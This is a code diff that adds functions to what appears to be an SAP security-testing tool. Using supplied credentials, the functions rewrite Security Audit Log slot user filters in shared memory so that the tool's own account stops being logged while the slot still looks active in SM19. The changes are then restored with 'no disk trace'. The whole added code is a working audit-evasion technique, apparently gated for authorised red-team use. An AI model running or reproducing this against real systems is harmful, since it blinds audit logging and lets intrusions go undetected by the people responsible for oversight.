@@ -826,6 +826,194 @@ def tier3_sal_slot_disable(state, node, slotno,
             slotno=str(slotno), hold_seconds=hold_seconds)
 
 
+def _try_stealth_sal_uname_narrow(state, node, sid, slotno,
+                                    replacement_uname, hold_seconds,
+                                    creds, technique) -> Optional[dict]:
+    """Stealth path for SAL slot UNAME swap via RSAU_UPD_AUDIT_CONFIG.
+
+    Returns ``None`` if legacy FMs aren't available (caller falls back).
+    On success the targeted slots' UNAME is replaced with
+    ``replacement_uname`` for ``hold_seconds`` and the baseline UNAME is
+    restored on exit (or on exception).
+    """
+    import time as _time
+    import sapmap_rfc
+
+    try:
+        with sapmap_rfc._get_connection(node, creds) as conn:
+            probe = read_legacy_sal_config(conn)
+    except Exception:
+        return None
+    if not probe["ok"] or not probe["slotinfo"]:
+        return None
+
+    with evasion_window(node, state, technique, creds=creds,
+                         touched_params=[],
+                         touched_dyn_profile=False):
+        with sapmap_rfc._get_connection(node, creds) as conn:
+            fresh = read_legacy_sal_config(conn)
+            if not fresh["ok"]:
+                return _wrap_result(
+                    technique, False,
+                    slotno=str(slotno), hold_seconds=hold_seconds,
+                    error=f"fresh legacy read failed: {fresh['error']}")
+
+            rows = fresh["slotinfo"]
+            baseline_rows = [dict(r) for r in rows]
+
+            augmented = [{**r, "SLOTNO": str(i + 1).zfill(4)}
+                         for i, r in enumerate(rows)]
+            target_slots = _normalize_slotnos(slotno, augmented)
+            if not target_slots:
+                return _wrap_result(
+                    technique, False,
+                    slotno=str(slotno), hold_seconds=hold_seconds,
+                    error="no target slots resolved")
+
+            max_slot = len(rows)
+            for s in target_slots:
+                idx = int(s) - 1
+                if idx < 0 or idx >= max_slot:
+                    return _wrap_result(
+                        technique, False,
+                        slotno=",".join(target_slots),
+                        hold_seconds=hold_seconds,
+                        error=f"slot {s} out of range (max {max_slot})")
+
+            baseline_unames = {}
+            for s in target_slots:
+                bu = rows[int(s) - 1].get("UNAME", "")
+                if isinstance(bu, bytes):
+                    bu = bu.decode("latin1", "replace")
+                baseline_unames[s] = str(bu).strip()
+
+            target_indices = {int(s) - 1 for s in target_slots}
+            mutated = [dict(r) for r in rows]
+            for idx in target_indices:
+                mutated[idx]["UNAME"] = replacement_uname
+
+            print(f"[*] {sid}: SAL UNAME narrow (stealth/SHM) — slots "
+                  f"{','.join(target_slots)} (baseline UNAMEs "
+                  f"{baseline_unames}) → {replacement_uname!r}")
+
+            w = write_legacy_sal_config(conn, mutated, enable="-")
+            if not w["ok"]:
+                return _wrap_result(
+                    technique, False,
+                    slotno=",".join(target_slots),
+                    hold_seconds=hold_seconds,
+                    baseline_unames=baseline_unames,
+                    error=f"stealth write failed: {w['error']}")
+
+            print(f"[+] {sid}: SAL slot(s) {','.join(target_slots)} "
+                  f"UNAME swapped (SHM-only) — holding {hold_seconds}s")
+
+        try:
+            from sapmap_findings import emit_finding
+            emit_finding(
+                "INFO", sid,
+                f"Tier 3: SAL slot(s) {','.join(target_slots)} UNAME "
+                f"swapped to {replacement_uname!r} via "
+                f"RSAU_UPD_AUDIT_CONFIG (shared-memory only — no disk "
+                f"persistence, no SM19 header change)")
+        except Exception:
+            pass
+
+        try:
+            _time.sleep(max(0.0, float(hold_seconds)))
+        finally:
+            print(f"[*] {sid}: restoring SAL UNAMEs (stealth/SHM)...")
+            try:
+                with sapmap_rfc._get_connection(node, creds) as conn:
+                    r = write_legacy_sal_config(conn, baseline_rows,
+                                                 enable="-")
+                    if r["ok"]:
+                        print(f"[+] {sid}: SAL UNAMEs restored "
+                              f"(SHM-only, no disk trace)")
+                    else:
+                        print(f"[!] {sid}: stealth restore failed: "
+                              f"{r['error']}")
+            except Exception as re:
+                print(f"[!] {sid}: stealth restore exception: {re}")
+
+    try:
+        from sapmap_findings import emit_finding
+        emit_finding("INFO", sid,
+                     f"Tier 3: SAL slot(s) {','.join(target_slots)} "
+                     f"UNAME restored (stealth — no disk trace)")
+    except Exception:
+        pass
+
+    return _wrap_result(
+        technique, True,
+        slotno=",".join(target_slots),
+        hold_seconds=hold_seconds,
+        baseline_unames=baseline_unames,
+        replacement_uname=replacement_uname,
+        after_restore="stealth via RSAU_UPD_AUDIT_CONFIG (SHM-only)",
+        stealth_mode=True)
+
+
+def tier3_sal_uname_narrow(state, node, slotno,
+                             replacement_uname: str,
+                             hold_seconds: float = 5.0,
+                             creds=None) -> dict:
+    """Swap the UNAME filter of one or more active SAL slots for a
+    hold window, then auto-restore.
+
+    The slot stays STATUS='X' (still appears active in SM19) but its
+    user-filter no longer matches SAPMAP00.  Only events from users
+    whose name matches ``replacement_uname`` are recorded by the slot
+    during the window.
+
+    Args:
+        slotno: ``"1"``, ``"1,2,3"``, list, or ``"ALL"``.
+        replacement_uname: SAL UNAME pattern to install (e.g. an
+            operator's real user; SAP* / wildcard support depends on
+            the slot's SEL_USER_GEN flag).
+        hold_seconds: how long to keep the swap in place.
+
+    Only the stealth writer is attempted.  Fallback to
+    RSAU_API_SET_PROFILE is intentionally NOT wired here because the
+    UNAME swap is purely a per-slot mutation and the stealth path
+    works on every kernel that exposes RSAU_UPD_AUDIT_CONFIG.
+    """
+    technique = "sal_uname_narrow"
+    try:
+        assert_evasion_allowed(state, node, technique)
+    except EvasionGateError as e:
+        return _wrap_result(technique, False, error=str(e),
+                             slotno=str(slotno),
+                             hold_seconds=hold_seconds)
+
+    replacement_uname = (replacement_uname or "").strip()
+    if not replacement_uname:
+        return _wrap_result(
+            technique, False,
+            slotno=str(slotno), hold_seconds=hold_seconds,
+            error="replacement_uname required")
+
+    sid = getattr(node, "sid", "?")
+    try:
+        stealth = _try_stealth_sal_uname_narrow(
+            state, node, sid, slotno, replacement_uname,
+            hold_seconds, creds, technique)
+        if stealth is not None:
+            return stealth
+        return _wrap_result(
+            technique, False,
+            slotno=str(slotno), hold_seconds=hold_seconds,
+            error="stealth writer unavailable (legacy RSAU FMs missing)")
+    except EvasionGateError as e:
+        return _wrap_result(technique, False, error=str(e),
+                             slotno=str(slotno),
+                             hold_seconds=hold_seconds)
+    except Exception as e:
+        return _wrap_result(
+            technique, False, error=f"unexpected: {e!r}",
+            slotno=str(slotno), hold_seconds=hold_seconds)
+
+
 def tier3_capture_baseline_only(state, node, creds=None) -> dict:
     """Standalone baseline capture without invoking any mutation.
 
